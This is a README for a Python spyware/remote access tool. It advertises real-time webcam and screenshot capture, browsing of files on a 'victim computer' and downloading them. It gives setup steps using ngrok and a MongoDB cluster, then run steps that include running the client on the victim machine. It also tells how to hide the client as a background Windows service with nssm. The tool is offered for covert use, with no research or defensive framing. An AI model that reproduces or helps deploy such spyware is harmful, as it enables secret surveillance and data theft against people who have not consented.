# Python Spyware / RAT

Features:-
 1) No port forwarding required
 2) Get webcam images in real time
 3) Get screenshot images in real time
 4) Browse through files on victim computer
 5) Download files from victim computer to your local machine

How to Configure:-
 1) Download ngrok, and copy ngrok.exe file to /main/
 2) Get your mongodb cluster url
 3) Replace the client variable in all three python files with your mongodb cluster url

How to run:-
 1) Run server.py
 2) Run client.py on victim machine
 3) Run master.py

How do I run client.py in background?
First convert client.py into .exe file, then use tools such as nssm to run the .exe file as a background windows service
